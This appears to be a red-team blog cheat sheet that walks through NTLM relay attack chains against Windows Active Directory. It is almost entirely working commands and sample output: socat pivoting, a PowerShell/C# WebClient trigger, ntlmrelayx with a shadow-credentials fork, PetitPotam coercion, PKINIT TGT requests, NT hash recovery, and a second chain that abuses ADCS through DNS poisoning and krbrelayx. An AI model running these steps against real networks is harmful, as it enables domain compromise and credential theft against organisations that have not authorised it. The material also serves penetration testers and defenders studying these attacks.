---
title: "NTLM Relay Attack"
date: 2025-7-25
tags: ["Shadow Credentials", "Attack Chain", "Ntlm", "Ldap", "Pass-The-Hash", "Impacket", "Ntlmreplay", "Petitpotam", "Active Directory", "Windows", "ADCS", "Webdav", "Pkinit", "Ticket Granting Ticket"]
---

### Abuse #1: Add Shadow Credential

#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)

```console
# Upload socat.zip and unzip
Expand-Archive -Path "<SOCAT_ZIP_FILE_PATH>" -DestinationPath "<DEST_PATH>" -Force
```

```console {class="sample-code"}
PS C:\xampp\htdocs> Expand-Archive -Path "C:\xampp\htdocs\socat.zip" -DestinationPath "C:\xampp\htdocs\" -Force
```

```console
.\socat.exe tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80
```

```console {class="sample-code"}
PS C:\xampp\htdocs\socat-windows-master> .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.31:80
      0 [main] socat 2084 find_fast_cwd: WARNING: Couldn't compute FAST_CWD pointer.  Please report this problem to
the public mailing list cygwin@cygwin.com
```

<small>*Ref: [socat](https://codeload.github.com/StudioEtrange/socat-windows/zip/refs/heads/master)*</small>

#### 2. Enable Webdav (Inside Windows Target) \[Optional\]

```console
$Source = @"
using System;
using System.Text;
using System.Security;
using System.Collections.Generic;
using System.Runtime.Versioning;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Diagnostics.CodeAnalysis;

namespace JosL.WebClient{
	public static class Starter{
		[StructLayout(LayoutKind.Explicit, Size=16)]
		public class EVENT_DESCRIPTOR{
			[FieldOffset(0)]ushort Id = 1;
			[FieldOffset(2)]byte Version = 0;
			[FieldOffset(3)]byte Channel = 0;
			[FieldOffset(4)]byte Level = 4;
			[FieldOffset(5)]byte Opcode = 0;
			[FieldOffset(6)]ushort Task = 0;
			[FieldOffset(8)]long Keyword = 0;
		}
 
		[StructLayout(LayoutKind.Explicit, Size = 16)]
		public struct EventData{
			[FieldOffset(0)]
			internal UInt64 DataPointer;
			[FieldOffset(8)]
			internal uint Size;
			[FieldOffset(12)]
			internal int Reserved;
		}
 
		public static void startService(){
			Guid webClientTrigger = new Guid(0x22B6D684, 0xFA63, 0x4578, 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7);
 
			long handle = 0;
			uint output = EventRegister(ref webClientTrigger, IntPtr.Zero, IntPtr.Zero, ref handle);
 
			bool success = false;
 
			if (output == 0){
				EVENT_DESCRIPTOR desc = new EVENT_DESCRIPTOR();
				unsafe
				{
					uint writeOutput = EventWrite(handle, ref desc, 0, null);
					success = writeOutput == 0;
					EventUnregister(handle);
				}
			}
		}
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern uint EventRegister(ref Guid guid, [Optional] IntPtr EnableCallback, [Optional] IntPtr CallbackContext, [In][Out] ref long RegHandle);
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern unsafe uint EventWrite(long RegHandle, ref EVENT_DESCRIPTOR EventDescriptor, uint UserDataCount, EventData* UserData);
 
		[DllImport("Advapi32.dll", SetLastError = true)]
		public static extern uint EventUnregister(long RegHandle);
	}
}
"@

$compilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
$compilerParameters.CompilerOptions="/unsafe"
Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $compilerParameters
[JosL.WebClient.Starter]::startService()
```

<br>

```console
# Run enable_webdav.ps1
C:\xampp\htdocs\enable_webdav.ps1
```

#### 3. Start ntlmrelayx Listener (In Local Linux)

#### Get impacket fork : Add Shadow Credentials Commands to Ntlmrelayx's Interactive LDAP Shell

```console
git clone -b interactive-ldap-shadow-creds https://github.com/Tw1sm/impacket.git
```

```console
cd impacket
```

```console
git checkout -b remotes/origin/interactive-ldap-shadow-creds
```

```console
python3 -m venv test
```

```console
source test/bin/activate
```

```console
pip install .
```

```console
pip3 install impacket pyOpenSSL==24.0.0
```

#### Run ntlmrelayx

```console
ntlmrelayx.py -t ldaps://<DC> --delegate-access -i
```

```console {class="sample-code"}
$ ntlmrelayx.py -t ldaps://192.168.100.100 --delegate-access -i

Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

#### 4. Run PetitPotam (In Local Linux)

```console
python3 PetitPotam.py -u '<USER>@<DOMAIN>' -hashes :<HASH> <SOCAT_HOSTNAME>@8090/test <SOCAT_LISTENER_IP> -pipe all
```

```console {class="sample-code"}
python3 PetitPotam.py -u "test.user@example.com" -hashes ":7ddf32e17a6ac5ce04a8ecbf782ca509" ms01@8090/test 192.168.100.101 -pipe all

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe efsr
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
Something went wrong, check error status => SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)
Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
---[SNIP]---
```

<small>*Ref: [PetitPotam](https://github.com/topotam/PetitPotam)*</small>

#### 5. Connect to LDAP Shell (In Local Linux)

```console
rlwrap nc 127.0.0.1 11000
```

```console {class="sample-code"}
$ rlwrap nc 127.0.0.1 11000
Type help for list of commands

# 
```

```console
clear_shadow_creds <TARGET_HOSTNAME>$
```

```console {class="sample-code"}
# clear_shadow_creds ms01$
Found Target DN: CN=MS01,CN=Computers,DC=example,DC=com
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

Shadow credentials cleared successfully!
```

```console
# Take Note of pfx path and password
set_shadow_creds <TARGET_HOSTNAME>$
```

#### 6. Request a TGT Using pfx File (In Local Linux)

```console
python3 gettgtpkinit.py '<DOMAIN>/<TARGET_HOSTNAME>$' <TARGET_HOSTNAME>.ccache -cert-pfx <RANDOM_CHARS>.pfx -pfx-pass <RANDOM_CHARS_PASSWORD> -dc-ip <DC_IP>
```

```console {class="sample-code"}
python3 gettgtpkinit.py example.com/MS01$ MS01.ccache -cert-pfx ../impacket/h6fAqHvi.pfx -pfx-pass LDyywqG39RKUx6kmjeHr -dc-ip 192.168.100.100
2024-04-02 16:17:58,897 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-04-02 16:17:58,907 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-04-02 16:18:07,594 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-04-02 16:18:07,594 minikerberos INFO     7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
INFO:minikerberos:7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
2024-04-02 16:18:07,597 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

<small>*Ref: [PKINITtools](https://github.com/dirkjanm/PKINITtools)*</small>

#### 7. Get NT Hash (In Local Linux)

```console
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```

```console {class="sample-code"}
$ python3 getnthash.py example.com/'ms01$' -key 7ddf32e17a6ac5ce04a8ecbf782ca509ac2b5f88fc33b7b9e0682be85784ec0d
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
59920e994636168744039017dcf49e54
```

<br>

---

### Abuse #2: Abusing Active Directory Certificate Services

#### 1. Run socat to Redirect Traffic (Inside Pivoting Node)

```console
./socat tcp-listen:8090,reuseaddr,fork tcp:<LOCAL_IP>:80 &
```

#### 2. DNS Poisoning

```console
python3 examples/ntlmrelayx.py -t "ldap://<DC_IP>" --no-smb-server --no-dump --no-da --no-acl --no-validate-privs --add-dns-record '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <LOCAL_IP>
```

#### 3. Add hostnames to /etc/hosts

```console
<DC_IP> <DC_HOSTNAME>.<DOMAIN>
<TARGET_IP> <TARGET_HOSTNAME>.<DOMAIN>
```

#### 4. Relay NTLM to ADCS

```console
python3 krbrelayx.py -t 'https://<DC_HOSTNAME>.<DOMAIN>/certsrv/certfnsh.asp' --adcs -v '<TARGET_HOSTNAME>$'
```

#### 5. Run PetitPotam

```console
proxychains4 -q python3 PetitPotam.py -u '<UESR>' -p '<PASSWORD>' -d <DOMAIN> '<DC_HOSTNAME>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA' <TARGET_HOSTNAME>.<DOMAIN>
```

#### 6. Request a TGT Using pfx file

```console
python3 gettgtpkinit.py -cert-pfx '<TARGET_HOSTNAME>$.pfx' '<DOMAIN>/<TARGET_HOSTNAME>$' '<TARGET_HOSTNAME>$.ccache'
```

#### 7. Get NT Hash

```console
python3 getnthash.py '<DOMAIN>/<TARGET_HOSTNAME>$' -key <AS_REP_ENC_KEY>
```